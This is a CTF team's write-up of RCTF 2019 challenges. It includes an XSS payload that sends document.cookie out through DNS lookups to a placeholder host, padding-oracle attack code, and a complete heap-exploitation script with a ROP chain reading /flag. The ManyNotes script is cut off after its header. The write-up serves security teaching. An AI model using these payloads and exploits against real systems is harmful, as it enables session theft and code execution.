# RCTF 2019

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190518-rctf2019/) of this writeup.**


 - [RCTF 2019](#rctf-2019)
   - [MISC](#misc)
     - [draw](#draw)
     - [printer](#printer)
   - [Reverse](#reverse)
     - [babyre1](#babyre1)
     - [babyre2](#babyre2)
     - [asm](#asm)
     - [DontEatMe](#donteatme)
   - [Web](#web)
     - [jail](#jail)
   - [Crypto](#crypto)
     - [f(x)](#fx)
     - [baby_aes](#baby_aes)
     - [baby_crypto](#baby_crypto)
       - [Padding oracle](#padding-oracle)
       - [Length extension attack](#length-extension-attack)
     - [random](#random)
       - [Pohlig-Hellman](#pohlig-hellman)
   - [Pwn](#pwn)
     - [babyheap](#babyheap)
     - [ManyNotes](#manynotes)
     - [shellcoder](#shellcoder)
     - [syscall_interface](#syscall_interface)
     - [chat](#chat)


## MISC
### draw


```
cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home

```

use `https://www.calormen.com/jslogo/` then you can get the flag easily.

### printer
- First, Pull out the no.675 packet in `Printer.pcapng`
- You'll realize this is TSPL/TSPL2 language
    - [https://www.tscprinters.com/EN/DownloadFile/DownloadFileSupport/1010/TSPL\_TSPL2\_Programming.pdf?m\_id=4356&ReturnUrl=support%2Fsupport\_download%2FTDP-225%20Series](https://www.tscprinters.com/EN/DownloadFile/DownloadFileSupport/1010/TSPL_TSPL2_Programming.pdf?m_id=4356&ReturnUrl=support%2Fsupport_download%2FTDP-225%20Series)

- there's two parts in the flag

```
BAR 348, 439, 2, 96
BAR 292, 535, 56, 2
BAR 300, 495, 48, 2
BAR 260, 447, 2, 88
BAR 204, 447, 56, 2
BAR 176, 447, 2, 96
BAR 116, 455, 2, 82
BAR 120, 479, 56, 2
BAR 44, 535, 48, 2
BAR 92, 455, 2, 80
BAR 20, 455, 72, 2
BAR 21, 455, 2, 40
BAR 21, 495, 24, 2
BAR 45, 479, 2, 16
BAR 36, 479, 16, 2
BAR 284, 391, 40, 2
BAR 324, 343, 2, 48
BAR 324, 287, 2, 32
BAR 276, 287, 48, 2
BAR 52, 311, 48, 2
BAR 284, 239, 48, 2
BAR 308, 183, 2, 56
BAR 148, 239, 48, 2
BAR 196, 191, 2, 48
BAR 148, 191, 48, 2
BAR 68, 191, 48, 2
BAR 76, 151, 40, 2
BAR 76, 119, 2, 32
BAR 76, 55, 2, 32
BAR 76, 55, 48, 2
BAR 112, 535, 64, 2
BAR 320, 343, 16, 2
BAR 320, 319, 16, 2
BAR 336, 319, 2, 24
BAR 56, 120, 24, 2
BAR 56, 87, 24, 2
BAR 56, 88, 2, 32
BAR 224, 247, 32, 2
BAR 256, 215, 2, 32
BAR 224, 215, 32, 2
BAR 224, 184, 2, 32
BAR 224, 191, 32, 2
BAR 272, 311, 2, 56
BAR 216, 367, 56, 2
BAR 216, 319, 2, 48
BAR 240, 318, 2, 49
BAR 184, 351, 2, 16
BAR 168, 351, 16, 2
BAR 168, 311, 2, 40
BAR 152, 351, 16, 2
BAR 152, 351, 2, 16

```
- draw this first with canvus you'll get flag part 1.
![](https://i.imgur.com/A0nxNIG.png)

- Flag part2 are two bitmap pictures


```
BITMAP 138,75,26,48,1

ffffffffffffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffffffffffffffc3ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffe3fffe1ffffffffff807c03c603fc07c07e0007f7ff01f8067ff007ff803fc07c03fff1ff1f04f8ff1ff1fff1fff3ffcff1f27fc7f1ff3e1ff1ff9ffff1ff1fc1fcff8ff1fff1fff3ffefe3f87f8ff9feff8ff1ff9ffff8ff1fc3fc7fcff1fff1fff1ffefc7fc7f9ff8fdffc7f1ff9ffff8ff1fc7fe3fc7f1fff1fff1ffefcffe7f1ff8f9ffc3f1ff9ffffc7f1fc7fe3fe3f1fff1fff0ffef8ffe7f1ff0fbffe3f1ff9ffffc7f1fc7fe3fe3f1fff1fff0ffef8ffe7e1ff8f3ffe3f1ff9ffffe3f1fc7fe3ff1f1fff1fff47fef8ffe7e3ff9f7ffe1f1ff9ffffe3f1fc7ff3ff8e1fff1fff47fef9ffe7e3ffffffff1f1ff9fffff1f1fc7ff3ff8c1fff1fff63fef9ffe7f1ffffffff1f1ff9fffff1f1fc7ff3ffc11fff1fff63fef9ffe7f1ffffffff1f1ff9fffff1f1fc7fe3ffe31fff1fff71fef9ffe7f1ffffffff1f1ff9fffff8f1fc7fe3ffe71fff1fff71fef8ffe7f8ffffffff0f1ff9fffff8f1fc7fe3ffcf1fff1fff78fef8ffe7fcffffffff0f1ff9fffffc61fc7fe7ff9f1fff1fff78fef8ffc7fe3fffffff0f1ff9fffffc41fc7fc7ff3f1fff1fff7c7efcffc7ff83ffffff0f9ff1fffffe11fc3f8fff7f1fff1fff7c7efc7fa7ff87ffffff0f9fe9fffffe31fc1f1ffe7f1fff1fff7e3efe3e67fe3fffffff1f8f99ffffff31fc403fe01f1fff1fff7e3eff80e0fc7fffffff1fc039fffffe71fc79ffffff1fff1fff7f1efff3eff8ffffffff1ff0f9fffffef1fc7fffffff1fff1fff7f0efffffff8ffffffff1ffff9fffffcf1fc7fffffff1fff1fff7f8efffffff8fffffffe1ffff9fffff9f1fc7fffffff1fff1fff7f86fffffff8ff9f7ffe3ffff9fffffbf1fc7fffffff1fff1fff7fc6fffffff8ff0f3ffe3ffff9fffff7f1fc7fffffff1fff1fff7fc2fffffff8ff8fbffc7ffff9ffffe7f1fc7fffffff1fff1fff7fe2fffffff8ff8f9ffc7ffff9ffffcff1fc7fffffff1fff1fff7ff0fffffffcff9f9ff8fffff9ffff8ff1fc7fffffff1fff1fff7ff0fffffffc7f9f8ff1fffff9ffff0ff0fc3fffffff1fff0ffe7ff8fffffffe1e7f83e3fffff8fffc03c03c0fffffff03e000780ff83fffffff80fff80ffffff83ffffffffdffffffff3ffffffffffffffffffffffffffffffffbffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff

```


```
BITMAP 130,579,29,32,1

ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc7fffffffffffffffffffffffffffffffffffffffffffffffffffffffe38fffffffffffffffffffffffffffffffffffffffffffffffffffffffdff7ffffffffffffffffffffffffffffffffffffffffffffffffffffff9ff3ffffffffffffffffffffffffffffffffffffffffffffffffffffff9ff3fffffffffffff9ffefbffc7ffffffe1fff8fffffffc3ffffffffff9ff3ff8ffffffffff0ffefbff39ff007f9c7fe72ffffff3c3fc07fffff87e78463f803ff01f0ffe7bfefefff7ff3f3f9f8fffffeff3ffbffffffc01fa3f9ffbfffe7f9ffe71fcfe7ff7ff7f9f9fcfffffeffbffbfffffffc07e7f9ffbfffe7ffffc71f9ff3ff7feff9f3fcfffffeffbffbffffffffe7e7f8ffbfffe7ffffd75f9ff3ff7ffffcf3fcfffffe7ffffbffffffffe7e7f9ffbfffe7ffffd35f9ff3ff7ffffcf3fcfffffe3ffffbfffffff80fe7f9ffbfffe7ffffd2cf9ff3ff7ffffcf3fcffffff07fffbfffffff7cfe7f3ffbfffe7ffffb2cf9ff3ff7fe000f3fcffffffc1fffbffffffe7e7e7c7ffbfffe7ffffbacf9ff3ff7fe7fcf3fcfffffff87ffbffffffe7e7e03fffbfffe7ffffb9ef9ff3ff7fe7fcf3fcfffffffe7ffbffffffefe7e7ffffbfffe7ffffb9e79ff3ff7fe7f9f3fcfffffeff3ffbffffffefe7e7f9ffbfffe7ffff79e7cfe7ff7ff3f9f9f8fffffeff3ffbffffffe7e7f7f1ffbfffe7f1ff79e7efcfff7ff3f3f9f0fffffe7f7ffbffffff27eff3f3ffbfffe7f0fe38e3f39fff7ffce7fc04fffffe1cfff9ffffff019ff9e7ffbfffe7f1fffffffc7fff7fff1fffbcfffffee3fff87fffffbe7ffe1fffbffe00ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfffe7ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfffe7ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfffe7ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfe7e7ffffffffffffff7ffffffffcfffffffffff3ffffffffffffffffbfe7efffffffffffffff7ffffffffcfffffffffff1ffffffffffffffffbfe7cfffffffffffffff03fffffffc3ffffffffff1ffffffffffffffff81f03fffffffffffffff3ffffffffcfffffffffffbffffffffffffffff9ffffff

```

- convert the hex data to binary data then you'll get the flag part 2.

![](https://i.imgur.com/ESBAAWp.png)
![](https://i.imgur.com/9r34fzT.png)

- combine two parts of flag: `flag{my_tsc_hc3pnikdk}`

## Reverse
### babyre1
* Our input will do some magic operation to become `Bingo!` if it matches the correct input
* Reverse from `Bingo!` to flag

```c=
#include <dlfcn.h>
#include <string.h>
#include <openssl/md5.h>

char* data="0123456789abcdef";
unsigned char out[MD5_DIGEST_LENGTH];
int main(int argc,char** argv){
	char** handle=dlopen("./babyre",RTLD_LAZY);
	char* code = *handle;
	void (*change)(char*,int,char*);		
	change = code+0xce0;
	unsigned char buf[]="Bingo!\x00\x00";
	for(int i=0,e=strlen(buf);i<e;i++){
		buf[i]^=0x17;
	}
	buf[6] = 0x2; // bruteforce 0~255 to match md5
	buf[7] = 0x2;
	change(buf,2,code+0x202010);
	char sol[0x17]="rctf{aaaaaaaaaaaaaaaa}";
	for(int i=0;i<8;i++){
		int a = buf[i]>>4;
		int b = buf[i]&0xf;
		sol[5+i*2+0]=data[a];
		sol[5+i*2+1]=data[b];
	}
	MD5_CTX c;
	MD5_Init(&c);
	MD5_Update(&c,sol,0x16);
	MD5_Final(out, &c);
	puts(sol);
    
	// MD5 match 5f8243a662cf71bf31d2b2602638dc1d
	for(int n=0; n<MD5_DIGEST_LENGTH; n++)
		printf("%02x", out[n]);
    
	puts("");

}

```
### babyre2

* First, it uses xxtea to encrypt a string with your account as the key.
* Then, it uses your password and data to create another key. And decrypt the encrypted string with the second key.
* The following code is the pseudo-code to generate the second key.


```python=
def second_key(data,password):
  data=data.decode("hex")
  key=""
  for i in password:
    key+=chr(ord(i)-(ord(i)/10)-(ord(i)%10))^0xcc
  return key

```
* When the two keys are identical, you can get flag.




```python=
from pwn import *

r=remote("139.180.215.222", 20000)
print r.recvuntil("account")
r.send("a"*16)
print r.recvuntil("password")
r.send("\x10"*16)
r.recvuntil("data")
r.send("010203040506070809ad0b0c0d0e0f") #ad=61^cc
r.shutdown("send")

r.interactive()
#rctf{f8b1644ac14529df029ac52b7b762493}

```

### asm

* Install [riscv-gnu-toolchain](https://github.com/riscv/riscv-gnu-toolchain)
* Use `riscv64-unknown-linux-gnu-objdump` to extract riscv assembly code.
* There are two loops in main function. The first one encodes your input flag. And the second one compares yout input with encoded flag.
* The following is the pseudo-code of first loop.

```python=
def first_loop(input):
  encoded_input=""
  for i in range(len(input)):
    t1=input[i]^input[(i+1)%31]
    a4=i
    a5=a4
    a5=a5<<1
    a5+=a4
    a5=a5<<5
    a5+=a4
    a4=a5
    a5=a4>>0x1f
    a5=a5>>0x18
    a4+=a5
    a4&=255
    a4-=a5
    encoded_input+=t1^a4
  return encoded_input

```

* Once you know that the first byte is `R`, you can easily construct the flag.



```python=
ii="1176d01e99b62c911245fb2a97c663b8147ce11e83e645a01963dd32a4df71".decode("hex") #encrypted flag
flag="R"

for i in range(len(ii)-1):
  a=ord(flag[i])
  a4=i
  a5=a4
  a5=a5<<1
  a5+=a4
  a5=a5<<5
  a5+=a4
  a4=a5
  a5=a4>>0x1f
  a5=a5>>0x18
  a4+=a5
  a4&=255
  a4-=a5
  fff=chr(a4^a^ord(ii[i]))
  flag+=fff
  print flag
  #RCTF{f5_is_not_real_reversing_}

```

### DontEatMe

* First, it will generate a maze. and you have to go to the destination.
* Use ollydbg, you can easily get the maze.

```
00 [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]
01 [1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1]
02 [1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1]
03 [1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1]
04 [1, 0, 1, 1, 1, 1, 0, 0, 0, D, 0, 0, 0, 1, 1, 1]
05 [1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1]
06 [1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1]
07 [1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1]
08 [1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1]
09 [1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1]
10 [1, 0, 0, 0, 0, S, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1]
11 [1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1]
12 [1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1]
13 [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]
14 [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]
15 [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]
S: starting point 
D: destination
1: Wall

```

* Then you should give a movement sequence that leads to the destination. And the length of the sequence should be 16.
* The movement sequence consists of four characters `asdw`
* The only correct sequence should be `ddddwwwaaawwwddd`
* But you can't just input the sequence. It will use blowfish to decrypt your input.
* Fortunately, the key is fixed and easy to extract at runtime. So the rest is using the key to encrypt `ddddwwwaaawwwddd`.
* Finally, the key is `\x00\x0f\x1a\x01\x35\x3a\x3b\x20` and the flag is `RCTF{db824ef8605c5235b4bbacfa2ff8e087}`
## Web

### jail

In the challenge, our objective is to steal the cookie. The website contains a XSS page that we can inject any HTML. Also we can send a link to admin. However the CSP is very strict:


```
sandbox allow-scripts allow-same-origin;
base-uri none;
default-src self;
script-src unsafe-inline self;
connect-src none;
object-src none;
frame-src none;
font-src data: self;
style-src unsafe-inline self;

```

The challenge is about how to exfiltrate the cookie in such strict CSP. What's worse, the XSS payload will be prepend some js to prevent `document.location` redirection.


```htmlmixed
<script>
window.addEventListener("beforeunload", function (event) {
  event.returnValue = "Are you sure want to exit?"
  return "Are you sure want to exit?"
})
Object.freeze(document.location) </script>

```

When trying to bypass `document.location` limitation, we found remote will send a DNS request and open a TCP connection (but not sending HTTP request). Thus it comes to us that maybe we can use DNS request to steal the cookie.


```htmlmixed
<script>
c ="";
for (let k of document.cookie)
  c+=(k.charCodeAt(0).toString(16))                                                                             
window.location.assign("http://" + c.substring(0, 60) + "." + c.substring(60, 120) + "."+ c.substring(120, 180) + ".example.com/");
</script>

```

I think it abuses remote browser's prefetching mechanism. The remote browser will only resolve the DNS address and open a TCP connection to `...example.com`, but it will not send any HTTP request. The bahavior is a little bit strange, isn't it?

You can refer to the official writeup [here](https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/jail%20%26%20password#jail).


## Crypto
### f(x)
In this task, we have evaluation result of a unknown polynomial on 0x200 random points over a unknown finite field.


```
K = [FLAG] + [rand(Nbits) for i in range(0xff)]
M = prime(Nbits)

def f(x):
    return x, sum(k[i] * pow(x, i, M) for i in range(len(K))) % M

for i in range(0x200):
    print "f(%d) = %d" % f(rand(Nbits))

```

The challenging part is that we don't know what `M` is.
To recover `M`, we use the fact that lagrange polynomial is the lowest degree polynomial.
The coefficients of monomials with degree larger than 0x100 will be zero (i.e. multiple of `M`).
Calculate all the coefficients of 0 ~ 0x200 degree's monomials need too much resources.
We calculate the coefficients of 0x101 degree's monomials on random subset of points instead.


```
# sagemath
import random
import multiprocessing as mp
from tqdm import tqdm, trange

from problem import enc

sz = 0x101

def worker(i):
    e = enc[:]
    rand = random.Random()
    rand.shuffle(e)
    x, y = zip(*e)
    dens = []
    for i in trange(sz):
        den = prod([x[i] - x[j] for j in range(sz) if i != j])
        dens.append(den)
    g = gcd(dens)
    dens = [den / g for den in tqdm(dens)]
    Z = prod(dens)
    nums = [y * (Z / den) for y, den in tqdm(zip(y, dens), total=len(dens))]
    num = sum(tqdm(nums))
    return num

pool = mp.Pool(24)
result = []
for n in pool.imap_unordered(worker, range(24)):
    result.append(n)

```

After we have 24 numbers which should be multiple of `M`, we calculate gcd of them, and factor it using `yafu`.
Once we have `M`, just build a Vandermonde matrix and solve it.


```
# sagemath
import libnum

from problem import enc

m = 81923...97099
F = IntegerModRing(m)
x, y = zip(*enc)
x, y = vector(F, x), vector(F, y)

print('Building vandermonde matrix')
M = Matrix.vandermonde(x)

print('Solving equations - this step takes several minutes')
z = M.solve_right(y)
print(repr(libnum.n2s(int(z[0]))))

```

### baby_aes
In this task, there's a AES implementation with different parameters (i.e. Sbox and Tbox).
The goal is to implement a decrypt routine for it.

The inverse of Sbox is easy. Just build a inverse lookup dictionary.


```
S_inv = {e: i for i, e in enumerate(S)}

```

For the Tbox, it gets more tricky.
Tbox is a combination of Sbox and multiplication of c(x) (See [this](https://crypto.stackexchange.com/questions/19175/efficient-aes-use-of-t-tables)).
Here's some properties we can found in these Tboxes:
1. We can verify that the modulo of c(x) is `x^4 + 1` by checking that T2~T4 is rotations of T1.
2. Tx[S_inv[0]] should be zero
3. c(x) = T1[S_inv[1]]
4. n * c(x) = T1[S_inv[n]]
All these properties are true for the tbox in this task.
Now, we know that `c(x)` is [8, 9, 7, 5].
To build the inverse of Tbox, we use sage to calculate the inverse over `x^4 + 1`.


```
import pickle


PGF2.<a> = PolynomialRing(GF(2))
f = a^8 + a^4 + a^3 + a + 1 # Rijndael Polynomial
F.<x> = GF(2^8, modulus=f)

def toint32(x):
    x = x.list()
    x = [ZZ(e.polynomial().coeffs(), 2) for e in x]
    return int(x[3] | (x[2] << 8) | (x[1] << 16) | (x[0] << 24))

P.<t> = PolynomialRing(F)
m = t^4 + 1
R.<u> = P.quo(m)
c = R([F(8.bits()), F(9.bits()), F(7.bits()), F(5.bits())])
c_inv = 1 / c

T_inv = [[ toint32(c_inv * (F(ZZ(i).bits()) * u^p)) for i in range(256)] for p in range(4)]

with open('inv.pkl', 'wb') as f:
    pickle.dump(T_inv, f)

```

We have all the inverse we need, undo each step of AES and decrypt the flag.

### baby_crypto

This is mainly a [padding oracle](https://en.wikipedia.org/wiki/Padding_oracle_attack) challenge along with [length extension attack](https://en.wikipedia.org/wiki/Length_extension_attack).
#### Padding oracle
This challenge will encrypt a plaintext `admin:0;username=xxxx;password=yyyy`, where we can control `xxxx` and `yyyy`, we make both of this `aaaaa`, with AES-CBC 128 with a random key and iv.
It will then provide us the iv, ciphertext and `sha1(key | plaintext)`. Later we can input a `iv | ciphertext | hash` string, it will decrypt it and check padding, then check hash.

1. we can apply the padding oracle attack to decrypt arbitary ciphertext.
2. we can construct correct ciphertext for arbitary plaintext since iv is controllable and that we can do arbitary decrypt.


```python=

def bxor(inp1, inp2):
    assert (len(inp1) == len(inp2))
    ret = b''
    for i in range(len(inp1)):
        ret += bytes([inp1[i] ^ inp2[i]])
    return ret
    
# enc is a encrypted aes block
# we decrypt one block at a time
def decrypt(enc):
    assert (len(enc) == 16)
    ans = b''
    for now in range(1, 17):
        for poss in range(256):
            guess = bytes([poss]) + ans
            guess_iv = bxor(guess, bytes([now])*now).rjust(16, b'x')
            guess_iv = binascii.hexlify(guess_iv).decode()
            # payload = iv + ciphertext + hash
            payload = guess_iv 
                        + binascii.hexlify(enc).decode() 
                        + binascii.hexlify(b'x'*20).decode()
            
            # now send it and see if we can
            # pass the padding check
            rrs('cookie:\n', payload)
            ret = rr('\n')
            if b'pad' not in ret:
                ans = guess
                print (ans)
                break
    return ans

```
#### Length extension attack
Now, what plaintext do we want?
Let's see what the challenge do if we pass both padding check and hash check


```python=

# cookie is decrypted plaintext
info = dict()
for _ in cookie.split(b";"):
    k, v = _.split(b":")
    info[k] = v
if info[b"admin"] == b"1":
    with open("flag") as f:
        flag = f.read()
        print("Your flag: %s" %flag)

```

so if we construct a plaintext like this:
`admin:0;username:aaaaa;password:aaaaa...;admin:1`
then `info[b'admin']` will eventually become `1`, then we can get flag. 

All we need now is to bypass the hash check. Luckliy, the challenge use `sha1`, which is vulnerable to length extension attack. We use [this tool](https://github.com/stephenbradshaw/hlextend) to calculate the correct plaintext, use padding oracle to get correct iv and ciphertext, and get flag.

flag : `RCTF{f2c519ea-567b-41d1-9db8-033f058b4e3e}`

### random

This is a challenge about [ECC](https://en.wikipedia.org/wiki/Elliptic-curve_cryptography) and [Pohlig-Hellman](https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm)
The equation is $\begin{equation} E: y^2 = x^3 + ax + b \end{equation}$ in $GF(m)$, where $m$ is a prime number.
It will first generate two point `P, Q` on $E$ and a random number `s`, then : 


```python=

# P = (x1, y1)
# Q = (x2, y2)
# mul is multiplication on elliptic curve E
for i in range(10):
    # s = (s*P)[0]
    s = mul(s, P, A, B, M)[0]
    
    # r = (s*Q)[0]
    r = mul(s, Q, A, B, M)[0]
    print("r%d: %d" % (i, r))

```

Our job is to guess `r10` to get flag. We know everything except initial `s` 

#### Pohlig-Hellman
Solving this problem is equivalent to solving `Q0 = sQ` with s unknown. So we simply apply Pohlig-Hellman on `s` twice to get initial `s`. Note that Pohlig-Hellman require a `Q` which its order can be factorized into rather small factors in order to do it fast enough (Time limit in this challenge is 450s, in our poor VM environment, we can solve the challenge in time if the biggest factor of order of `Q` is less than `1e12`). After nearly two hours of trying, we finally get flag......

flag : `RCTF{83d37980-47c2-4373-a0ee-181b5603ee7e}`

P.S. I believe there should be much much better solution to this chal, yet the best crypto-ist in our team is busy solving another challenge..., hope that other teams can give better solutions!


## Pwn

### babyheap
* Heap overflow, off-by-one null byte.
* Libc-2.23 house of orange => set_context.
* execveat(0,'/bin/sh',0,0,0) & echo * , find /flag.
* Open, read and write get flag.

`rctf{15172bc66a5f317986cb8293597e033c}`

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '139.180.215.222'
port = 20001

binary = "./babyheap"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def add(size):
  r.recvuntil(": \n")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline(str(size))
  pass

def edit(index,data):
  r.recvuntil(": \n")
  r.sendline("2")
  r.recvuntil(": ")
  r.sendline(str(index))
  r.recvuntil(": ")
  r.send(data)
  pass

def delete(index):
  r.recvuntil(": \n")
  r.sendline("3")
  r.recvuntil(": ")
  r.sendline(str(index))
  pass

def show(index,start,end):
  r.recvuntil(": \n")
  r.sendline("4")
  r.recvuntil(": ")
  r.sendline(str(index))
  pass
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':

  add(0x18)  # 0
  add(0x3ff) # 1
  add(0x18)  # 2
  delete(1)
  delete(0)
  add(0x18) # 0
  edit(0,"A"*0x18)
  add(0x18)      # 1
  add(0x18)      # 3
  delete(1)
  delete(2)

  add(0x3b0)      # 1
  add(0x18)   # 2
  add(0x208)  # 4
  add(0x18)   # 5
  add(0x18)   # 6
  add(0x18)   # 7
  delete(6)
  delete(4)
  show(3,"","")
  heap = u64(r.recv(6).ljust(8,"\x00")) - 0x270
  print("heap = {}".format(hex(heap)))
  add(0x18) # 4
  show(3,"","")
  libc = u64(r.recv(6).ljust(8,"\x00")) - 0x3c4b78
  print("libc = {}".format(hex(libc)))
  add(0x208) # 6
  edit(6, "A"*0x18 + p64(0x21) + "A"*0x18 + p64(0x21) + "A"*0x18 + p64(0x21))
  delete(1)
  io_list_all = libc + 0x3c5520
  set_context = libc + 0x47b75
  edit(0,"\x00"*0x17)

  pop_rsp = 0x0000000000003838 + libc
  system = libc + 0x45390
  stream = "/bin/sh\x00" + p64(0x61) # fake file stream
  stream += p64(0xddaa) + p64(io_list_all-0x10) # Unsortbin attack
  stream += p64(heap+0x148) + "C"*0x10 + p64(0) + p64(1) + cyclic(0x58)
  stream += p64(heap+0x80)
  stream += p64(pop_rsp) + "D"*0x10
  stream += p64(1)

  pop_rax = 0x0000000000033544 + libc
  pop_rdi = 0x0000000000021102 + libc
  pop_rsi = 0x00000000000202e8 + libc
  pop_rdx = 0x0000000000001b92 + libc
  pop_r8_movrax1 = 0x0000000000135136 + libc
  pop_r10 = 0x00000000001150a5 + libc
  syscall = 0x00000000000bc375 + libc
  
  #rop = (p64(pop_r8_movrax1) + p64(0) + p64(pop_rax) + p64(322) + p64(pop_rdi) + p64(0) + 
  #    p64(pop_rsi) + p64(heap+0x1b0) + p64(pop_rdx) + p64(0) + p64(pop_r10) + p64(0) + p64(syscall)  # execveat
  #    )
  #edit(6, "A"*0x10 + stream + "A"*0x10 + p64(heap+0x128) + p64(set_context) + rop + "/bin/sh\x00")
  
  rop =(p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(heap+0x220) + 
      p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall) +

      p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3) + 
      p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x100) + p64(syscall) +

      p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) + 
      p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x100)+p64(syscall)
      )
  edit(6, "A"*0x10 + stream + "A"*0x10 + p64(heap+0x128) + p64(set_context) + rop + "/flag\x00")
  
  raw_input("@")
  add(0x100)

  r.interactive()

```

### ManyNotes

* Much like the challenge null on n1CTF 2018 ``~.~`` .
* Overflow on the thread's heap.  
* We allocate a lot of memory space, the allocated space will be above the thread's main_arena.(mmap)
* Heap overflow to modify tcache to malloc_hook.
* Tcache attack to modify malloc_hook to one_gadget. Get shell.

I got the shell on local but the remote failed. 
Billy used my expolit remote to succeed. WTFFFFFFFFFFFFF?????????????



```
0x00007fa720000000 0x00007fa728000000 rw-p      mapped   <=  thread's heap (We can overflow the next mapped)
0x00007fa728000000 0x00007fa72bfff000 rw-p      mapped   <=  thread's main_arena & thread's tcache & thread's heap

0x7fa728000000: 0x00007fa728000020      0x0000000000000000
0x7fa728000010: 0x0000000003fff000      0x0000000003fff000 
0x7fa728000020: 0x0000000300000000      0x0000000000000000 <= thread's main_arena
0x7fa728000030: 0x0000000000000000      0x0000000000000000
0x7fa728000040: 0x0000000000000000      0x0000000000000000
0x7fa728000050: 0x0000000000000000      0x0000000000000000
0x7fa728000060: 0x0000000000000000      0x0000000000000000
0x7fa728000070: 0x0000000000000000      0x00007fa718001020
0x7fa728000080: 0x0000000000000000      0x00007fa728000078
0x7fa728000090: 0x00007fa728000078      0x00007fa728000088
0x7fa7280000a0: 0x00007fa728000088      0x00007fa728000098
0x7fa7280000b0: 0x00007fa728000098      0x00007fa7280000a8
....
0x7fa7280008b0: 0x0000000000000000      0x0000000000000255  <=  thread's tcache
0x7fa7280008c0: 0x0000000000000000      0x0000000000010000
0x7fa7280008d0: 0x0000000000000000      0x0000000000000000
0x7fa7280008e0: 0x0000000000000000      0x0000000000000000

```
`RCTF{House_of_0range_in_Thread}`


```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '123.206.174.203'
port = 20003

binary = "./many_notes"
context.binary = binary
elf = ELF(binary)
